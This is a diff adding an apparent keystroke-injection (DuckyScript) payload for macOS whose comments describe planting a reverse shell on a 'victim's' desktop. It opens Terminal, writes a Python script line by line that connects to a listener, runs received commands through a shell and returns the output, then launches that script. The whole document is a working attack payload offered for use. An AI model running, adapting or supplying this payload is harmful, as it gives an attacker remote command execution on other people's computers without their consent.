@@ -1,0 +1,52 @@
+REM Title: Reverse shell python script write
+REM Description: Will write a reverse shell python script and save it onto the victim's desktop and when ran, will connect to my kali linux VM
+REM Target: macOS 11.0+
+REM
+REM Open Terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+REM Create and write the reverse shell Python script
+STRING echo '#!/usr/bin/env python3' > ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'import socket' > ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'import subprocess' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'server_address = "127.0.0.1"' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'server_port = 1111' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'conn.connect((server_address, server_port))' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo 'while True:' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo '    conn.send(b"$ ")' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo '    command = conn.recv(1024)' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo '    result = subprocess.run(command, capture_output=True, text=True, shell=True)' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 500
+STRING echo '    conn.send(result.stdout.encode())' >> ~/Desktop/reverse_shell.py
+ENTER
+DELAY 1000
+
+REM Execute the Python reverse shell script
+STRING python3 ~/Desktop/reverse_shell.py
+ENTER
